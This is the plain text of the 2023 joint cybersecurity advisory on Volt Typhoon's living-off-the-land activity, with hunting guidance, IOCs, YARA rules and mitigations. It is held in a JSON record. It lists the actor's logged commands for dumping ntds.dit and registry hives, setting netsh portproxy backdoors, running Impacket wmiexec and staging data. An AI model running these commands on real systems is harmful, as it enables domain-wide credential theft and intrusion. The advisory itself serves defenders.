{
    "id": "4d2756b6-7fd4-4ec3-8c68-cd1b450eec18",
    "created_at": "2023-06-05T02:07:56.180556Z",
    "updated_at": "2024-11-22T02:03:28.774606Z",
    "deleted_at": null,
    "sha1_hash": "b299f3685100e68d79d30b8949428b0f954d3cc9",
    "title": "2023-05-24 - AA23-144a- People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection",
    "authors": "",
    "file_creation_date": "2023-06-04T13:02:57Z",
    "file_modification_date": "2023-06-04T13:02:57Z",
    "file_size": 922989,
    "plain_text": "People's Republic of China State-Sponsored Cyber Actor\nLiving off the Land to Evade Detection\ncisa.gov/news-events/cybersecurity-advisories/aa23-144a\n\nCybersecurity Advisory\nRelease Date\nMay 24, 2023\nAlert Code\nAA23-144a\n\nSummary\nThe United States and international cybersecurity authorities are issuing this joint\nCybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of interest\nassociated with a People’s Republic of China (PRC) state-sponsored cyber actor, also known\nas Volt Typhoon. Private sector partners have identified that this activity affects networks\nacross U.S. critical infrastructure sectors, and the authoring agencies believe the actor could\napply the same techniques against these and other sectors worldwide.\n\n1/24\n\nThis advisory from the United States National Security Agency (NSA), the U.S. Cybersecurity\nand Infrastructure Security Agency (CISA), the U.S. Federal Bureau of Investigation (FBI),\nthe Australian Signals Directorate’s Australian Cyber Security Centre (ACSC), the\nCommunications Security Establishment’s Canadian Centre for Cyber Security (CCCS), the\nNew Zealand National Cyber Security Centre (NCSC-NZ), and the United Kingdom National\nCyber Security Centre (NCSC-UK) (hereafter referred to as the “authoring agencies”)\nprovides an overview of hunting guidance and associated best practices to detect this\nactivity.\nOne of the actor’s primary tactics, techniques, and procedures (TTPs) is living off the land,\nwhich uses built-in network administration tools to perform their objectives. This TTP allows\nthe actor to evade detection by blending in with normal Windows system and network\nactivities, avoid endpoint detection and response (EDR) products that would alert on the\nintroduction of third-party applications to the host, and limit the amount of activity that is\ncaptured in default logging configurations. Some of the built-in tools this actor uses are:\nwmic, ntdsutil, netsh, and PowerShell. The advisory provides examples of the actor’s\ncommands along with detection signatures to aid network defenders in hunting for this\nactivity. Many of the behavioral indicators included can also be legitimate system\nadministration commands that appear in benign activity. Care should be taken not to assume\nthat findings are malicious without further investigation or other indications of compromise.\nDownload the PDF version of this report (723 KB)\nFor a downloadable copy of IOCs, see\nPeople's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade\nDetection (XML, 34.57 KB )\nFor a downloadable copy of IOCs in JSON format, see AA23-144A.stix.json\n\nTechnical Details\nThis advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the\nAppendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.\n\nBackground\nThe authoring agencies are aware of recent People’s Republic of China (PRC) statesponsored cyber activity and have identified potential indicators associated with these\ntechniques. This advisory will help net defenders hunt for this activity on their systems. It\nprovides many network and host artifacts associated with the activity occurring after the\nnetwork has been initially compromised, with a focus on command lines used by the cyber\nactor. An Indicators of compromise (IOCs) summary is included at the end of this advisory.\n\n2/24\n\nEspecially for living off the land techniques, it is possible that some command lines might\nappear on a system as the result of benign activity and would be false positive indicators of\nmalicious activity. Defenders must evaluate matches to determine their significance, applying\ntheir knowledge of the system and baseline behavior. Additionally, if creating detection logic\nbased on these commands, network defenders should account for variability in command\nstring arguments, as items such as ports used may differ across environments.\n\nArtifacts\nNetwork artifacts\nThe actor has leveraged compromised small office/home office (SOHO) network devices as\nintermediate infrastructure to obscure their activity by having much of the command and\ncontrol (C2) traffic emanate from local ISPs in the geographic area of the victim. Owners of\nSOHO devices should ensure that network management interfaces are not exposed to the\nInternet to avoid them being re-purposed as redirectors by malicious actors. If they must be\nexposed to the Internet, device owners and operators should ensure they follow zero trust\nprinciples and maintain the highest level of authentication and access controls possible.\nThe actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with\nhardcoded C2 callbacks [T1090] to ports 8080, 8443, 8043, 8000, and 10443 with various\nfilenames including, but not limited to:\ncisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and\nWmiPrvSE.exe.\n\nHost artifacts\nWindows management instrumentation (WMI/WMIC)\nThe actor has executed the following command to gather information about local drives\n[T1082]:\ncmd.exe /C \"wmic path win32_logicaldisk get\ncaption,filesystem,freespace,size,volumename\"\n\nThis command does not require administrative credentials to return results. The command\nuses a command prompt [T1059.003] to execute a Windows Management Instrumentation\nCommand Line (WMIC) query, collecting information about the storage devices on the local\nhost, including drive letter, file system (e.g., new technology file system [NTFS]), free space\nand drive size in bytes, and an optional volume name. Windows Management\nInstrumentation (WMI) is a built-in Windows tool that allows a user to access management\ninformation from hosts in an enterprise environment. The command line version of WMI is\ncalled WMIC.\n\n3/24\n\nBy default, WMI Tracing is not enabled, so the WMI commands being executed and the\nassociated user might not be available. Additional information on WMI events and tracing\ncan be found in the References section of the advisory.\nNtds.dit Active Directory database\nThe actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows\ndomain controllers (DCs) out of the network to perform password cracking [T1003.003]. (The\nntds.dit file is the main Active Directory (AD) database file and, by default, is stored at\n%SystemRoot%\\NTDS\\ntds.dit. This file contains information about users, groups, group\nmemberships, and password hashes for all users in the domain; the SYSTEM registry hive\ncontains the boot key that is used to encrypt information in the ntds.dit file.) Although the\nntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow\nCopy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may\nalso be obtained from the Shadow Copy. The following example commands show the actor\ncreating a Shadow Copy and then extracting a copy of the ntds.dit file from it.\ncmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp\ncmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTDS\\ntds.dit\nC:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp\n\nThe built-in Ntdsutil.exe tool performs all these actions using a single command. There are\nseveral ways to execute Ntdsutil.exe, including running from an elevated command prompt\n(cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the execution of\nNtdsutil.exe commands using long, short, or a combination of the notations. For example, the\nlong notation command activate instance ntds ifm can also be executed using the short\nnotation ac i ntds i. Table 1 provides the long and short forms of the arguments used in the\nsample Ntdsutil.exe command, along with a brief description of the arguments.\nTable 1: Ntdsutil.exe command syntax\nLong\nform\n\nShort\nform\n\nactivate\ninstance\n%\n\nac i\n%\n\nSets variable % as the active instance for ntdsutil to use\n\nifm\n\ni\n\nInstall from media (ifm). Creates installation media to be used with\nDCPromo so the server will not need to copy data from another Domain\nController on the network\n\nDescription\n\n4/24\n\nThe actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file and\nSYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a\nstandalone example; multiple examples are provided to show how syntax and file paths may\ndiffer per environment.\nwmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full\nC:\\Windows\\Temp\\pro\nwmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full\nC:\\Windows\\Temp\\Pro\"\nwmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i\nntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\"\n\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs &\nntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"\ncmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp &\nntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1>\n\\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1\n\nNote: The <timestamp value> would be an epoch timestamp following the format like\n“__1684956600.123456”.\nEach actor command above creates a copy of the ntds.dit database and the SYSTEM and\nSECURITY registry hives in the C:\\Windows\\Temp\\<folder> directory, where <folder> is\nreplaced with the path specified in the command (e.g., pro, tmp, or McAfee_Logs). By\ndefault, the hidden ADMIN$ share is mapped to C:\\Windows\\, so the last command will direct\nstandard output and error messages from the command to a file within the folder specified.\nThe actor has also saved the files directly to the C:\\Windows\\Temp and C:\\Users\\Public\ndirectories, so the entirety of those directory structures should be analyzed. Ntdsutil.exe\ncreates two subfolders in the directory specified in the command: an Active Directory folder\nthat contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM\nand SECURITY hives. Defenders should look for this folder structure across their network:\n<path specified in command>\\Active Directory\\ntds.dit\n<path specified in command>\\Active Directory\\ntds.jfm\n<path specified in command>\\registry\\SECURITY\n<path specified in command>\\registry\\SYSTEM\n\nWhen one of the example commands is executed, several successive log entries are created\nin the Application log, under the ESENT Source. Associated events can be viewed in\nWindows Event Viewer by navigating to: Windows Logs | Application. To narrow results to\n\n5/24\n\nrelevant events, select Filter Current Log from the Actions menu on the right side of the\nscreen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to\nID numbers 216, 325, 326, and 327. Clicking the OK box will apply the filters to the results.\nSince ESENT logging is used extensively throughout Windows, defenders should focus on\nevents that reference ntds.dit. If such events are present, the events’ details should contain\nthe file path where the file copies were created. Since these files can be deleted, or\nenhanced logging may not be configured on hosts, the file path can greatly aid in a hunt\noperation. Identifying the user associated with this activity is also a critical step in a hunt\noperation as other actions by the compromised—or actor-created—user account can be\nhelpful to understand additional actor TTPs, as well as the breadth of the actor's actions.\nNote: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain\nshould be considered compromised, as the actor will generally be able to crack the password\nhashes for domain user accounts, create their own accounts, and/or join unauthorized\nsystems to the domain. If this occurs, defenders should follow guidance for removing\nmalicious actors from victim networks, such as CISA's Eviction Guidance for Network\nAffected by the SolarWinds and Active Directory/M365 Compromise.\nIn addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools\ncould be used by an actor to obtain the same information:\nSecretsdump.py\nNote: This script is a component of Impacket, which the actor has been known to\nuse\nInvoke-NinjaCopy (PowerShell)\nDSInternals (PowerShell)\nFgDump\nMetasploit\nBest practices for securing ntds.dit include hardening Domain Controllers and monitoring\nevent logs for ntdsutil.exe and similar process creations. Additionally, any use of\nadministrator privileges should be audited and validated to confirm the legitimacy of\nexecuted commands.\nPortProxy\nThe actor has used the following commands to enable port forwarding [T1090] on the host:\n\"cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0\nlistenport=9999 connectaddress=<rfc1918 internal ip address> connectport=8443\nprotocol=tcp\"\"\n\"cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100\nlistenaddress=0.0.0.0 connectport=1433 connectaddress=<rfc1918 internal ip address>\"\n\n6/24\n\nwhere <rfc1918 internal ip address> is replaced with an IPv4 address internal to the network,\nomitting the < >’s.\nNetsh is a built-in Windows command line scripting utility that can display or modify the\nnetwork settings of a host, including the Windows Firewall. The portproxy add command is\nused to create a host:port proxy that will forward incoming connections on the provided\nlistenaddress and listenport to the connectaddress and connectport. Administrative privileges\nare required to execute the portproxy command. Each portproxy command above will create\na registry key in the HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\ path.\nDefenders should look for the presences of keys in this path and investigate any anomalous\nentries.\nNote: Using port proxies is not common for legitimate system administration since they can\nconstitute a backdoor into the network that bypasses firewall policies. Administrators should\nlimit port proxy usage within environments and only enable them for the period of time in\nwhich they are required.\nDefenders should also use unusual IP addresses and ports in the command lines or registry\nentries to identify other hosts that are potentially included in actor actions. All hosts on the\nnetwork should be examined for new and unusual firewall and port forwarding rules, as well\nas IP addresses and ports specified by the actor. If network traffic or logging is available,\ndefenders should attempt to identify what traffic was forwarded though the port proxies to aid\nin the hunt operation. As previously mentioned, identifying the associated user account that\nmade the networking changes can also aid in the hunt operation.\nFirewall rule additions and changes can be viewed in Windows Event Viewer by navigating\nto:\nApplications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced\nSecurity | Firewall.\n\nIn addition to host-level changes, defenders should review perimeter firewall configurations\nfor unauthorized changes and/or entries that may permit external connections to internal\nhosts. The actor is known to target perimeter devices in their operations. Firewall logs should\nbe reviewed for any connections to systems on the ports listed in any portproxy commands\ndiscovered.\nPowerShell\nThe actor has used the following PowerShell [T1059.001] command to identify successful\nlogons to the host [T1033]:\nGet-EventLog security -instanceid 4624\n\n7/24\n\nNote: Event ID 4624 is logged when a user successfully logs on to a host and contains\nuseful information such as the logon type (e.g., interactive or networking), associated user\nand computer account names, and the logon time. Event ID 4624 entries can be viewed in\nWindows Event Viewer by navigating to:\nWindows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications\nand Service Logs | Windows PowerShell.\n\nThis command identifies what user account they are currently leveraging to access the\nnetwork, identify other users logged on to the host, or identify how their actions are being\nlogged. If the actor is using a password spray technique [T1110.003], there may be several\nfailed logon (Event ID 4625) events for several different user accounts, followed by one or\nmore successful logons (Event ID 4624) within a short period of time. This period may vary\nby actor but can range from a few seconds to a few minutes.\nIf the actor is using brute force password attempts [T1110] against a single user account,\nthere may be several Event ID 4625 entries for that account, followed by a successful logon\nEvent ID 4624. Defenders should also look for abnormal account activity, such as logons\noutside of normal working hours and impossible time-and-distance logons (e.g., a user\nlogging on from two geographically separated locations at the same time).\nImpacket\nThe actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file\nwithin the victim host's ADMIN$ share (C:\\Windows\\) containing an epoch timestamp in its\nname. The following is an example of the \"dir\" command being executed by wmiexec.py:\ncmd.exe /Q /c *dir 1> \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1\nNote: Discovery of an entry similar to the example above in the Windows Event Log and/or a\nfile with a name in a similar format may be evidence of malicious activity and should be\ninvestigated further. In the event that only a filename is discovered, the epoch timestamp\nwithin the filename reflects the time of execution by default and can be used to help scope\nthreat hunting activities.\nEnumeration of the environment\nThe following commands were used by the actor to enumerate the network topology [T1016],\nthe active directory structure [T1069.002], and other information about the target\nenvironment [T1069.001], [T1082]:\n\n8/24\n\narp -a\ncurl www.ip-api.com\ndnscmd . /enumrecords /zone {REDACTED}\ndnscmd . /enumzones\ndnscmd /enumrecords {REDACTED} . /additional\nipconfig /all\nldifde.exe -f c:\\windows\\temp\\<filename>.txt -p subtree\nnet localgroup administrators\nnet group /dom\nnet group \"Domain Admins\" /dom\nnetsh interface firewall show all\nnetsh interface portproxy show all\nnetsh interface portproxy show v4tov4\nnetsh firewall show all\nnetsh portproxy show v4tov4\nnetstat -ano\nreg query hklm\\software\\\nsysteminfo\ntasklist /v\nwhoami\nwmic volume list brief\nwmic service brief\nwmic product list brief\nwmic baseboard list full\nwevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and\nTimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]\n\nAdditional credential theft\n9/24\n\nThe actor also used the following commands to identify additional opportunities for obtaining\ncredentials in the environment [T1555], [T1003]:\ndir C:\\Users\\{REDACTED}\\.ssh\\known_hosts\ndir C:\\users\\{REDACTED}\\appdata\\roaming\\Mozilla\\firefox\\profiles\nmimikatz.exe\nreg query hklm\\software\\OpenSSH\nreg query hklm\\software\\OpenSSH\\Agent\nreg query hklm\\software\\realvnc\nreg query hklm\\software\\realvnc\\vncserver\nreg query hklm\\software\\realvnc\\Allusers\nreg query hklm\\software\\realvnc\\Allusers\\vncserver\nreg query hkcu\\software\\{REDACTED}\\putty\\session\nreg save hklm\\sam ss.dat\nreg save hklm\\system sy.dat\n\nAdditional commands\nThe actor executed the following additional commands:\n\n10/24\n\n7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z\nC:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe\nC:\\Windows\\System32\\cmdbak.exe /c ping -n 1 127.0.0.1 >\nC:\\Windows\\temp\\putty.log\nC:\\Windows\\Temp\\tmp.log\n\"cmd.exe\" /c dir \\\\127.0.0.1\\C$ /od\n\"cmd.exe\" /c ping –a –n 1 <IP address>\n\"cmd.exe\" /c wmic /user:<username> /password:<password> process call create \"net stop\n\\\"<service name>\\\" > C:\\Windows\\Temp\\tmp.log\"\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2 2>&1\nnet use \\\\127.0.0.1\\IPC$ /y /d\npowershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden\nrar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED} D:\\{REDACTED}\\\nwmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami\nxcopy C:\\windows\\temp\\hp d:\\{REDACTED}\n\nMitigations\nThe authoring agencies recommend organizations implement the mitigations below to\nimprove your organization’s cybersecurity posture on the basis of the threat actor’s activity.\nThese mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs)\ndeveloped by CISA and the National Institute of Standards and Technology (NIST). The\nCPGs provide a minimum set of practices and protections that CISA and NIST recommend\nall organizations implement. CISA and NIST based the CPGs on existing cybersecurity\nFrameworks and guidance to protect against the most common and impactful threats and\nTTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on\nthe CPGs, including additional recommended baseline protections.\nDefenders should harden domain controllers and monitor event logs [2.T] for\nntdsutil.exe and similar process creations. Additionally, any use of administrator\nprivileges should be audited and validated to confirm the legitimacy of executed\ncommands.\nAdministrators should limit port proxy usage within environments and only enable them\nfor the period of time in which they are required [2.X].\n\n11/24\n\nDefenders should investigate unusual IP addresses and ports in command lines,\nregistry entries, and firewall logs to identify other hosts that are potentially involved in\nactor actions.\nIn addition to host-level changes, defenders should review perimeter firewall\nconfigurations for unauthorized changes and/or entries that may permit external\nconnections to internal hosts.\nDefenders should also look for abnormal account activity, such as logons outside of\nnormal working hours and impossible time-and-distance logons (e.g., a user logging on\nfrom two geographically separated locations at the same time).\nDefenders should forward log files to a hardened centralized logging server, preferably\non a segmented network [2.F].\n\nLogging recommendations\nTo be able to detect the activity described in this CSA, defenders should set the audit policy\nfor Windows security logs to include “audit process creation” and “include command line in\nprocess creation events” in addition to accessing the logs. Otherwise, the default logging\nconfigurations may not contain the necessary information.\nEnabling these options will create Event ID 4688 entries in the Windows Security log to view\ncommand line processes. Given the cost and difficulty of logging and analyzing this kind of\nactivity, if an organization must limit the requirements, they should focus on enabling this kind\nof logging on systems that are externally facing or perform authentication or authorization,\nespecially including domain controllers.\nTo hunt for the malicious WMI and PowerShell activity, defenders should also log WMI and\nPowerShell events. By default, WMI Tracing and deep PowerShell logging are not enabled,\nbut they can be enabled by following the configuration instructions linked in the References\nsection.\nThe actor takes measures to hide their tracks, such as clearing logs [T1070.001]. To ensure\nlog integrity and availability, defenders should forward log files to a hardened centralized\nlogging server, preferably on a segmented network. Such an architecture makes it harder for\nan actor to cover their tracks as evidence of their actions will be captured in multiple\nlocations.\nDefenders should also monitor logs for Event ID 1102, which is generated when the audit log\nis cleared. All Event ID 1102 entries should be investigated as logs are generally not cleared\nand this is a known actor tactic to cover their tracks. Even if an event log is cleared on a\nhost, if the logs are also stored on a logging server, the copy of the log will be preserved.\nThis activity is often linked to malicious exploitation of edge devices and network\nmanagement devices. Defenders should enable logging on their edge devices, to include\nsystem logs, to be able to identify potential exploitation and lateral movement. They should\n12/24\n\nalso enable network-level logging, such as sysmon, webserver, middleware, and network\ndevice logs.\n\nIndicators of compromise (IOCs) summary\nTTPs\nExploiting vulnerabilities [T1190] in widely used software including, but not limited to:\nCVE-2021-40539—ManageEngine ADSelfService Plus.\nhttps://www.cisa.gov/uscert/ncas/alerts/aa21-259a.\nCVE-2021-27860—FatPipe WARP, IPVPN, MPVPN.\nhttps://www.ic3.gov/Media/News/2021/211117-2.pdf.\nUsing webshells for persistence and exfiltration [T1505.003], with at least some of the\nwebshells derived from the Awen webshell.\nUsing compromised Small-Office Home-Office (SOHO) devices (e.g. routers) to\nobfuscate the source of the activity [T1090.002].\nMost common types include ASUS, Cisco RV, Draytek Vigor, FatPipe\nIPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel USG\ndevices.\nCommon CVEs for these devices and mitigation guidance can be found in the\njoint Cybersecurity Advisory, “Top CVEs Actively Exploited by People’s Republic\nof China State-Sponsored Cyber Actors.”\nUsing living off the land tools for discovery, lateral movement, and collection activities,\nto include:\ncertutil\ndnscmd\nldifde\nmakecab\nnet user/group/use\nnetsh\nnltest\nntdsutil\nPowerShell\nreq query/save\nsysteminfo\ntasklist\nwevtutil\nwmic\nxcopy\nSelective clearing of Windows Event Logs, system logs, and other technical artifacts to\nremove evidence of their intrusion activity [T1070].\n\n13/24\n\nUsing open source “hacktools” tools, such as:\nFast Reverse Proxy (frp) – Probably derived from the publicly-available fatedier\nand EarthWorm variants.\nImpacket – To detect Impacket usage, see the joint Cybersecurity Advisory:\n\"Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense\nIndustrial Base Organization”.\nMimikatz.exe\nRemote administration tools – Defenders should consult the joint Cybersecurity\nAdvisory: \"Protecting Against Malicious Use of Remote Monitoring and\nManagement Software\".\n\nCommand execution\nFile names and directory paths used in these commands are only meant to serve as\nexamples. Actual names and paths may differ depending on environment and activity, so\ndefenders should account for variants when performing queries.\nNote: Many of the commands are derivatives of common system administration commands\nthat could generate false positives when used alone without additional indicators.\n\n14/24\n\n7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z c:\\windows\\temp\\*\n\"C:\\pstools\\psexec.exe\" \\\\{REDACTED} -s cmd /c \"cmd.exe /c \"netsh interface portproxy\ndelete v4tov4 listenaddress=0.0.0.0 listenport=9999\"\"\nC:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe\ncmd.exe /C dir /S \\\\{REDACTED}\\c$\\Users\\{REDACTED} >> c:\\windows\\temp\\{REDACTED}.tmp\n\n\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs &\nntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"\ncmd.exe /Q /c *cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1\ncmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1652470932.9400265 2>&1\ncmd.exe /Q /c net group \"domain admins\" /dom 1>\\\\127.0.0.1\\ADMIN$\\__<timestamp value>\n2>&1\ncmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp &\nntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1>\n\\\\127.0.0.1\\ADMIN$\\<timestamp value> 2>&1\nD:\\{REDACTED}\\xcopy C:\\windows\\temp\\hp d:\\{REDACTED}\nGet-EventLog security -instanceid 4624\nldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree\nmakecab ..\\backup\\210829-020000.zip ..\\webapps\\adssp\\html\\Lock.lic\nmove \"\\\\<redacted>\\c$\\users\\public\\Appfile\\registry\\SYSTEM\" ..\\backup\\210829020000.zip\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999\nconnectaddress={REDACTED} connectport=8443 protocol=tcp\nnetsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999\n\nRar.exe a –{REDACTED} c:\\Windows\\temp\\DMBC2C61.tmp\nstart-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle hidden 1\n\nNote: The batch file in question (<filename>.bat) could use any name, and no discernable\npattern has been determined at this time.\n\n15/24\n\nwmic process call create \"cmd.exe /c mkdir C:\\users\\public\\Appfile & ntdsutil \\\"ac i\nntds\\\" ifm \\\"create full C:\\users\\public\\Appfile\\\" q q\nwmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i\nntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\"\nwmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full\nC:\\Windows\\Temp\\Pro\"\nwmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\\"\n\nCommand line patterns\nCertain patterns in commands (with asterisks for wildcards) can be used to identify\npotentially malicious commands:\ncmd.exe /C dir /S \\\\* >> *\ncmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\__*.*>&1\npowershell start-process -filepath c:\\windows\\temp\\*.exe -windowstyle hidden\n\nFile paths\nThe most common paths where files and executables used by the actor have been found\ninclude:\nC:\\Users\\Public\\Appfile (including subdirectories)\nC:\\Perflogs (including subdirectories)\nC:\\Windows\\Temp (including subdirectories)\n\nFile names\nThe file names the actor has previously used for such things as malware, scripts, and tools\ninclude:\nbackup.bat\n\ncl64.exe\n\nupdate.bat\n\nWin.exe\n\nbillagent.exe\n\nnc.exe\n\nupdate.exe\n\nWmiPrvSE.exe\n\nbillaudit.exe\n\nrar.exe\n\nvm3dservice.exe\n\nWmiPreSV.exe\n\ncisco_up.exe\n\nSMSvcService.exe\n\nwatchdogd.exe\n\nIn addition to the file names and paths above, malicious files names, believed to be randomly\ncreated, in the following format have also been discovered:\n\n16/24\n\nC:\\Windows\\[a-zA-Z]{8}.exe\n\nSHA-256 file hashes\nf4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd\nef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31\nd6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca\n472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d\n66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7\n3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71\n41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597\nc7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99\n3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f\nfe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15\nee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484\n\nUser-agent\nIn some cases, the following user-agent string (including the extra spacing) was identified\nperforming reconnaissance activities by this actor:\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)\nFirefox/68.0\n\nGecko/20100101\n\nNote: The spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.\n\nYara rules\n\n17/24\n\nrule ShellJSP {\nstrings:\n$s1 = \"decrypt(fpath)\"\n$s2 = \"decrypt(fcontext)\"\n$s3 = \"decrypt(commandEnc)\"\n$s4 = \"upload failed!\"\n$s5 = \"aes.encrypt(allStr)\"\n$s6 = \"newid\"\ncondition:\nfilesize < 50KB and 4 of them\n}\n\nrule EncryptJSP {\nstrings:\n$s1 = \"AEScrypt\"\n$s2 = \"AES/CBC/PKCS5Padding\"\n$s3 = \"SecretKeySpec\"\n$s4 = \"FileOutputStream\"\n$s5 = \"getParameter\"\n$s6 = \"new ProcessBuilder\"\n$s7 = \"new BufferedReader\"\n$s8 = \"readLine()\"\ncondition:\nfilesize < 50KB and 6 of them\n}\n\n18/24\n\nrule CustomFRPClient {\nmeta:\ndescription=”Identify instances of the actor's custom FRP tool based on\nunique strings chosen by the actor and included in the tool”\nstrings:\n$s1 = \"%!PS-Adobe-\" nocase ascii wide\n$s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide\n$s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase ascii wide\n$s4 = \"MAGA2024!!!\" nocase ascii wide\n$s5 = \"HTTP_PROXYHost: %s\" nocase ascii wide\n\ncondition:\nall of them\n}\n\nrule HACKTOOL_FRPClient {\nmeta:\ndescription=”Identify instances of FRP tool (Note: This tool is known to be\nused by multiple actors, so hits would not necessarily imply activity by the\nspecific actor described in this report)”\nstrings:\n$s1 = \"%!PS-Adobe-\" nocase ascii wide\n$s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide\n$s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase ascii wide\n$s4 = \"HTTP_PROXYHost: %s\" nocase ascii wide\n\ncondition:\n3 of them\n}\n\nReferences\n\n19/24\n\nActive Directory and domain controller hardening:\nBest practices: https://learn.microsoft.com/en-us/windows-server/identity/adds/plan/security-best-practices/best-practices-for-securing-active-directory\nCISA regional cyber threats:\nPRC state-sponsored activity: China Cyber Threat Overview and Advisories\nMicrosoft Threat Intelligence blog:\nVolt Typhoon activity: https://www.microsoft.com/en-us/security/blog/2023/05/24/volttyphoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/\nNtdsutil.exe:\nOverview: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windowsserver-2012-r2-and-2012/cc753343(v=ws.11)\nPowerShell:\nBest practices:\nhttps://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERS\nHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF\nLogging configuration: https://www.mandiant.com/resources/blog/greater-visibility\nWindows command line process auditing:\nOverview: https://learn.microsoft.com/en-us/windows-server/identity/adds/manage/component-updates/command-line-process-auditing\nWindows Defender Firewall:\nBest practices: https://learn.microsoft.com/en-us/windows/security/threatprotection/windows-firewall/best-practices-configuring\nLogging configuration: https://learn.microsoft.com/en-us/windows/security/threatprotection/windows-firewall/configure-the-windows-firewall-log\nWindows management instrumentation:\nEvents: https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmiactivity#obtaining-wmi-events-through-event-viewer\nTracing activity: 